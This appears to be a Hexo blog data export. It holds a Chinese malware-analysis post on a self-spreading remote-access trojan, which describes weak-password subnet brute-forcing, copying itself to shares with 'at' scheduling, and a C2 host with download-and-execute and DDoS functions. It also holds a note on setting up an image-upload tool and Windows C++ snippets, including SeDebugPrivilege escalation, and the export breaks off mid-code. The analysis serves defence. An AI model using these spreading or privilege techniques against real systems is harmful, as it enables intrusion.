class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190912110554278.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091211080334.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>点击脱壳之后修复下导入表就好了，修复之后查壳效果<br><img src=\"https://img-blog.csdnimg.cn/20190912111234244.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h4><p>导入函数<br><img src=\"https://img-blog.csdnimg.cn/20190912112624974.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>还有很多字符串就不列了，格式都是这种。<br>从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能<br>基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。</p>\n<h4 id=\"动态加IDA\"><a href=\"#动态加IDA\" class=\"headerlink\" title=\"动态加IDA\"></a>动态加IDA</h4><p>该样本定义大量局部变量，使用硬编码方式存储数据<br><img src=\"https://img-blog.csdnimg.cn/20190912113106227.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>移动到ascii上，右键char就可以看到字符了<br><img src=\"https://img-blog.csdnimg.cn/20190912113423102.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里创了一个名为121212的互斥体，防止程序多开。</p>\n<p>尝试打开注册表项<code>HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\.Net CLR</code><br><img src=\"https://img-blog.csdnimg.cn/20190912114556853.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>第一次找不到值 直接退出<br>接着就开始创建新线程</p>\n<p>程序中还有一个枚举资源的回调函数，但是并没有执行起来</p>\n<h3 id=\"线程1\"><a href=\"#线程1\" class=\"headerlink\" title=\"线程1\"></a>线程1</h3><p><img src=\"https://img-blog.csdnimg.cn/20190912114858505.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>创建第一个线程<br><img src=\"https://img-blog.csdnimg.cn/20190912114930476.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>硬编码很多常用账户和弱口令密码<br>下面看看怎么玩的</p>\n<p>首先通过<code>gethostname</code>获取主机信息,然后通过<code>gethostbyname</code>获取主机IP地址，这里默认是掩码为<code>24</code>的网段。</p>\n<p>使用弱口令爆破这个网段的每一台主机</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019091213240296.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>分别遍历上面的UserName和PassWord表，调用<code>402A40()</code>函数进行爆破<br>看看具体过程<br><img src=\"https://img-blog.csdnimg.cn/20190912130116130.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>先尝试连接一波服务器</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190912130156139.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序</p>\n<p>最后再使用<code>at</code> 让程序2分钟后执行</p>\n<p>就是这样，程序就开始了横向传播</p>\n<h3 id=\"线程2\"><a href=\"#线程2\" class=\"headerlink\" title=\"线程2\"></a>线程2</h3><p><img src=\"https://img-blog.csdnimg.cn/20190912140134565.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>创建第二个线程<br>会获取当前日期与<code>20130221</code>比较<br>然后又会创建一个线程<br><img src=\"https://img-blog.csdnimg.cn/20190912140748479.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>继续看这个Rat线程，这个线程才是这个木马的核心，命令执行<br><img src=\"https://img-blog.csdnimg.cn/20190912141038643.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091214092223.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会尝试连接<code>arwah.uy1433.com:8090</code>服务器<br><img src=\"https://img-blog.csdnimg.cn/20190912141724864.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>向C2发送配置信息，大致内容如下。<br><img src=\"https://img-blog.csdnimg.cn/20190912142056932.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里还会调用<code>4036c8()</code>来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。<br><img src=\"https://img-blog.csdnimg.cn/20190912142409368.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会使用<code>select</code>接收发来的数据</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019091214260294.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能1：下载文件执行\"><a href=\"#远控功能1：下载文件执行\" class=\"headerlink\" title=\"远控功能1：下载文件执行\"></a>远控功能1：下载文件执行</h4><p>当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序<br><img src=\"https://img-blog.csdnimg.cn/20190912143533196.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能2：清除运行记录\"><a href=\"#远控功能2：清除运行记录\" class=\"headerlink\" title=\"远控功能2：清除运行记录\"></a>远控功能2：清除运行记录</h4><p>这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，<br><img src=\"https://img-blog.csdnimg.cn/20190912144509224.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>删除相应值<br><img src=\"https://img-blog.csdnimg.cn/20190912145143590.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能3：使用ie访问指定地址\"><a href=\"#远控功能3：使用ie访问指定地址\" class=\"headerlink\" title=\"远控功能3：使用ie访问指定地址\"></a>远控功能3：使用ie访问指定地址</h4><p>这个可以进行DDos攻击，或者展示广告页面给被害者。<br><img src=\"https://img-blog.csdnimg.cn/20190912145226470.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能4：攻击模块\"><a href=\"#远控功能4：攻击模块\" class=\"headerlink\" title=\"远控功能4：攻击模块\"></a>远控功能4：攻击模块</h4><p>下面还有一个用来网络攻击的专用模块<br><img src=\"https://img-blog.csdnimg.cn/20190916152048725.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091615140094.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190916151556490.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块</p>\n<h3 id=\"线程3\"><a href=\"#线程3\" class=\"headerlink\" title=\"线程3\"></a>线程3</h3><p>创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多<br><img src=\"https://img-blog.csdnimg.cn/20190912151723315.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190912153059337.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为<code>192.168.1.107</code>的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。</p>\n<h2 id=\"样本溯源\"><a href=\"#样本溯源\" class=\"headerlink\" title=\"样本溯源\"></a>样本溯源</h2><p>arwah.uy1433.com:8090<br>192.168.1.107</p>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>结束该进程<br>删除木马文件</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>@[toc]</p>\n<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sample.exe</td>\n<td>rat</td>\n<td>4D049BC19B03572EF8A00980050BAFFF</td>\n<td>28160 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令<br>该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190912201229272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190912110554278.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091211080334.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>点击脱壳之后修复下导入表就好了，修复之后查壳效果<br><img src=\"https://img-blog.csdnimg.cn/20190912111234244.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h4><p>导入函数<br><img src=\"https://img-blog.csdnimg.cn/20190912112624974.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>还有很多字符串就不列了，格式都是这种。<br>从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能<br>基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。</p>\n<h4 id=\"动态加IDA\"><a href=\"#动态加IDA\" class=\"headerlink\" title=\"动态加IDA\"></a>动态加IDA</h4><p>该样本定义大量局部变量，使用硬编码方式存储数据<br><img src=\"https://img-blog.csdnimg.cn/20190912113106227.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>移动到ascii上，右键char就可以看到字符了<br><img src=\"https://img-blog.csdnimg.cn/20190912113423102.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里创了一个名为121212的互斥体，防止程序多开。</p>\n<p>尝试打开注册表项<code>HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\.Net CLR</code><br><img src=\"https://img-blog.csdnimg.cn/20190912114556853.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>第一次找不到值 直接退出<br>接着就开始创建新线程</p>\n<p>程序中还有一个枚举资源的回调函数，但是并没有执行起来</p>\n<h3 id=\"线程1\"><a href=\"#线程1\" class=\"headerlink\" title=\"线程1\"></a>线程1</h3><p><img src=\"https://img-blog.csdnimg.cn/20190912114858505.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>创建第一个线程<br><img src=\"https://img-blog.csdnimg.cn/20190912114930476.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>硬编码很多常用账户和弱口令密码<br>下面看看怎么玩的</p>\n<p>首先通过<code>gethostname</code>获取主机信息,然后通过<code>gethostbyname</code>获取主机IP地址，这里默认是掩码为<code>24</code>的网段。</p>\n<p>使用弱口令爆破这个网段的每一台主机</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019091213240296.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>分别遍历上面的UserName和PassWord表，调用<code>402A40()</code>函数进行爆破<br>看看具体过程<br><img src=\"https://img-blog.csdnimg.cn/20190912130116130.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>先尝试连接一波服务器</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190912130156139.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序</p>\n<p>最后再使用<code>at</code> 让程序2分钟后执行</p>\n<p>就是这样，程序就开始了横向传播</p>\n<h3 id=\"线程2\"><a href=\"#线程2\" class=\"headerlink\" title=\"线程2\"></a>线程2</h3><p><img src=\"https://img-blog.csdnimg.cn/20190912140134565.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>创建第二个线程<br>会获取当前日期与<code>20130221</code>比较<br>然后又会创建一个线程<br><img src=\"https://img-blog.csdnimg.cn/20190912140748479.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>继续看这个Rat线程，这个线程才是这个木马的核心，命令执行<br><img src=\"https://img-blog.csdnimg.cn/20190912141038643.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091214092223.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会尝试连接<code>arwah.uy1433.com:8090</code>服务器<br><img src=\"https://img-blog.csdnimg.cn/20190912141724864.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>向C2发送配置信息，大致内容如下。<br><img src=\"https://img-blog.csdnimg.cn/20190912142056932.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里还会调用<code>4036c8()</code>来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。<br><img src=\"https://img-blog.csdnimg.cn/20190912142409368.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会使用<code>select</code>接收发来的数据</p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019091214260294.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能1：下载文件执行\"><a href=\"#远控功能1：下载文件执行\" class=\"headerlink\" title=\"远控功能1：下载文件执行\"></a>远控功能1：下载文件执行</h4><p>当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序<br><img src=\"https://img-blog.csdnimg.cn/20190912143533196.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能2：清除运行记录\"><a href=\"#远控功能2：清除运行记录\" class=\"headerlink\" title=\"远控功能2：清除运行记录\"></a>远控功能2：清除运行记录</h4><p>这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，<br><img src=\"https://img-blog.csdnimg.cn/20190912144509224.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>删除相应值<br><img src=\"https://img-blog.csdnimg.cn/20190912145143590.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能3：使用ie访问指定地址\"><a href=\"#远控功能3：使用ie访问指定地址\" class=\"headerlink\" title=\"远控功能3：使用ie访问指定地址\"></a>远控功能3：使用ie访问指定地址</h4><p>这个可以进行DDos攻击，或者展示广告页面给被害者。<br><img src=\"https://img-blog.csdnimg.cn/20190912145226470.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"远控功能4：攻击模块\"><a href=\"#远控功能4：攻击模块\" class=\"headerlink\" title=\"远控功能4：攻击模块\"></a>远控功能4：攻击模块</h4><p>下面还有一个用来网络攻击的专用模块<br><img src=\"https://img-blog.csdnimg.cn/20190916152048725.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2019091615140094.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190916151556490.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块</p>\n<h3 id=\"线程3\"><a href=\"#线程3\" class=\"headerlink\" title=\"线程3\"></a>线程3</h3><p>创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多<br><img src=\"https://img-blog.csdnimg.cn/20190912151723315.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190912153059337.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为<code>192.168.1.107</code>的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。</p>\n<h2 id=\"样本溯源\"><a href=\"#样本溯源\" class=\"headerlink\" title=\"样本溯源\"></a>样本溯源</h2><p>arwah.uy1433.com:8090<br>192.168.1.107</p>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>结束该进程<br>删除木马文件</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。</p>\n"},{"title":"写作环境Typora+picgo+gitee","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-oxmlym.jpg","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-oxmlym.jpg","_content":"\n### 背景\n\n​\t\t日常有笔记，但是都不是很好用（vscode 界面不太喜欢）所以选用typora，但是这个软件的图片上传有点麻烦，官方在0.9.86才支持图片上传，但是都是搭配picgo，原来都是github+picgo，问题多，经常抽风，上传不了。\n\n​\t\t狠下心改用国内的码云，上传速度快，国内加载也快。\n\n### 开始\n\n有人踩过坑，我们就学习就好了\n\nhttps://zhuanlan.zhihu.com/p/102594554\n\n基本跟着安装就行。\n\n#### 几个重要步骤\n\n插件使用\n\n![image-20200317205814205](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205814205.png)\n\n\n\nGitee配置如下\n\n![image-20200317205847316](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205847316.png)\n\n代理位置一定要用**36677**端口\n\n![image-20200317205939770](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205939770.png)\n\n**typora配置**\n\n\n\n我这里选用exe，core不会配置。。。\n\n**注意 typora默认使用36677端口和picgo通信，注意36677端口是否是picgo在用**\n\n![image-20200317210018170](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317210018170.png)","source":"_posts/写作环境Typora+picgo+gitee.md","raw":"---\ntitle: 写作环境Typora+picgo+gitee\ntags: [开发]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-oxmlym.jpg\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-oxmlym.jpg\n---\n\n### 背景\n\n​\t\t日常有笔记，但是都不是很好用（vscode 界面不太喜欢）所以选用typora，但是这个软件的图片上传有点麻烦，官方在0.9.86才支持图片上传，但是都是搭配picgo，原来都是github+picgo，问题多，经常抽风，上传不了。\n\n​\t\t狠下心改用国内的码云，上传速度快，国内加载也快。\n\n### 开始\n\n有人踩过坑，我们就学习就好了\n\nhttps://zhuanlan.zhihu.com/p/102594554\n\n基本跟着安装就行。\n\n#### 几个重要步骤\n\n插件使用\n\n![image-20200317205814205](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205814205.png)\n\n\n\nGitee配置如下\n\n![image-20200317205847316](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205847316.png)\n\n代理位置一定要用**36677**端口\n\n![image-20200317205939770](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205939770.png)\n\n**typora配置**\n\n\n\n我这里选用exe，core不会配置。。。\n\n**注意 typora默认使用36677端口和picgo通信，注意36677端口是否是picgo在用**\n\n![image-20200317210018170](https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317210018170.png)","slug":"写作环境Typora+picgo+gitee","published":1,"date":"2020-03-18T01:26:39.544Z","updated":"2020-03-18T01:53:16.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw632001pccuqk2lbjibm","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>​        日常有笔记，但是都不是很好用（vscode 界面不太喜欢）所以选用typora，但是这个软件的图片上传有点麻烦，官方在0.9.86才支持图片上传，但是都是搭配picgo，原来都是github+picgo，问题多，经常抽风，上传不了。</p>\n<p>​        狠下心改用国内的码云，上传速度快，国内加载也快。</p>\n<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><p>有人踩过坑，我们就学习就好了</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/102594554\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/102594554</a></p>\n<p>基本跟着安装就行。</p>\n<h4 id=\"几个重要步骤\"><a href=\"#几个重要步骤\" class=\"headerlink\" title=\"几个重要步骤\"></a>几个重要步骤</h4><p>插件使用</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205814205.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205814205\"></p>\n<p>Gitee配置如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205847316.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205847316\"></p>\n<p>代理位置一定要用<strong>36677</strong>端口</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205939770.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205939770\"></p>\n<p><strong>typora配置</strong></p>\n<p>我这里选用exe，core不会配置。。。</p>\n<p><strong>注意 typora默认使用36677端口和picgo通信，注意36677端口是否是picgo在用</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317210018170.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317210018170\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>​        日常有笔记，但是都不是很好用（vscode 界面不太喜欢）所以选用typora，但是这个软件的图片上传有点麻烦，官方在0.9.86才支持图片上传，但是都是搭配picgo，原来都是github+picgo，问题多，经常抽风，上传不了。</p>\n<p>​        狠下心改用国内的码云，上传速度快，国内加载也快。</p>\n<h3 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h3><p>有人踩过坑，我们就学习就好了</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/102594554\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/102594554</a></p>\n<p>基本跟着安装就行。</p>\n<h4 id=\"几个重要步骤\"><a href=\"#几个重要步骤\" class=\"headerlink\" title=\"几个重要步骤\"></a>几个重要步骤</h4><p>插件使用</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205814205.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205814205\"></p>\n<p>Gitee配置如下</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205847316.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205847316\"></p>\n<p>代理位置一定要用<strong>36677</strong>端口</p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317205939770.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317205939770\"></p>\n<p><strong>typora配置</strong></p>\n<p>我这里选用exe，core不会配置。。。</p>\n<p><strong>注意 typora默认使用36677端口和picgo通信，注意36677端口是否是picgo在用</strong></p>\n<p><img src=\"https://gitee.com//L0yy/BlogImg/raw/master/typora/image-20200317210018170.png\" srcset=\"/cray/img/loading.gif\" alt=\"image-20200317210018170\"></p>\n"},{"title":"常用代码","index_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-wyk166.jpg","banner_img":"https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-wyk166.jpg","_content":"\n[toc]\n\n### Visual Studio相关\n\n#### 定义字符串常量的差别\n\nvs2019\n\n```c++\nconst WCHAR* Mes1 = L\"Hello world!\";   //较为严格\nWCHAR Mes2[] = L\"Hello world!\";\nWCHAR Mes3[] = { L'A',L'B',L'R',L'l',0};//注意是单引号\nchar Mes4[] = {'a','b','v'};\n```\n\nvs2013\n\n```c\nWCHAR* Mes1 = L\"Hello world!\";\nWCHAR Mes2[] = L\"Hello world!\";\nWCHAR Mes3[] = { L'A',L'B',L'R',L'l',0};\nchar Mes4[] = {'a','b','v'};\n```\n\n### 错误提示\n\n```c++\n#include <windows.h>\n#include <strsafe.h>\n\nvoid ErrorExit(const char* lpszFunction)\n{\n\tLPVOID lpMsgBuf;\n\tchar Mes[1024] = { 0, };\n\tLPVOID lpDisplayBuf;\n\tDWORD dw = GetLastError();\n\n\tFormatMessageA(\n\t\tFORMAT_MESSAGE_ALLOCATE_BUFFER |\n\t\tFORMAT_MESSAGE_FROM_SYSTEM |\n\t\tFORMAT_MESSAGE_IGNORE_INSERTS,\n\t\tNULL,\n\t\tdw,\n\t\tMAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n\t\t(LPSTR)& lpMsgBuf,\n\t\t0, NULL);\n\n\tsprintf_s(Mes, \"%s failed with error 0x%x: %s\", lpszFunction, dw, lpMsgBuf);\n\tMessageBoxA(NULL, Mes, \"failed\", MB_OK);\n\tExitProcess(dw);\n}\n\nvoid main()\n{\n\tif (!GetProcessId(NULL))\n\t\tErrorExit(\"GetProcessId\");\n}\n```\n\n\n\n### 宏定义相关\n\n#### 定义函数\n\n```\ntypedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(\n\tIN HANDLE               ThreadHandle,\n\tIN THREAD_INFORMATION_CLASS ThreadInformationClass,\n\tOUT PVOID               ThreadInformation,\n\tIN ULONG                ThreadInformationLength,\n\tOUT PULONG              ReturnLength OPTIONAL);\n\t\ntypedef struct _THREAD_BASIC_INFORMATION\n{\n\tNTSTATUS                ExitStatus;\n\tPVOID                   TebBaseAddress;\n\tint\t\t\t\t\t\tClientId;\n\tKAFFINITY               AffinityMask;\n\tint\t\t\t\t\t\tPriority;\n\tint\t\t\t\t\t\tBasePriority;\n\tint\t\t\t\t\t\tv;\n} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;\n\t\nvoid Func()\n{\n\tFN_NtQueryInformationThread NtQueryInformationThread =(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L\"Ntdll.dll\"), \"NtQueryInformationThread\");\n\tNtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);\n}\n```\n\n\n\n### 提权操作\n\n#### 令牌方式\n\n```c++\n// 传入参数 SeDebugPrivilege，提升到调试权限\n\nBOOL GrantPriviledge(WCHAR* PriviledgeName)\n{\n    TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;\n    DWORD             dwReturnLength = sizeof(OldPrivileges);\n    HANDLE             TokenHandle = NULL;\n    LUID             uID;\n\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &TokenHandle))\n    {\n        if (GetLastError() != ERROR_NO_TOKEN)\n        {\n            return FALSE;\n        }\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))\n        {\n            return FALSE;\n        }\n    }\n\n    if (!LookupPrivilegeValue(NULL, PriviledgeName, &uID))        // 通过权限名称查找uID\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数\n    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    TokenPrivileges.Privileges[0].Luid = uID;\n\n    if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &OldPrivileges, &dwReturnLength))\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    CloseHandle(TokenHandle);\n    cout<< \"[+] AdjustTokenPrivileges to SeDebugPrivilege Success!\" << endl;\n    return TRUE;\n}\n\n```\n#### RtlAdjustPrivilege\n\n```c++\n// 传入参数 SE_DEBUG_PRIVILEGE，提升到调试权限\n\n#define SE_DEBUG_PRIVILEGE                (20L)\n\ntypedef\nNTSTATUS(NTAPI * 